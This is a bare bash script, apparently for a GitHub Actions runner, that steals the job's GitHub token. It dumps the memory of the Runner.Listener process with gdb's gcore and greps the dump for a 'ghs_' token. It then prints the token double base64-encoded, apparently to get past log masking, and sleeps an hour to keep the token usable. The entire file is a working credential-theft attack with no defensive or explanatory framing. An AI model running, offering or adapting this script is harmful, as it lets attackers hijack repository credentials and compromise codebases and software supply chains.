#!/bin/bash

sudo apt-get install -y gdb && \
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"

TOKEN=$(grep -oaP -m 1 '\b((?:g\x00h\x00s\x00)_\x00[a-zA-Z0-9\x00]{36,80})\b' k.dump*)

FIXED_TOKEN=${TOKEN:0:40}

echo $FIXED_TOKEN | base64 -w 0 | base64 -w 0

sleep 3600
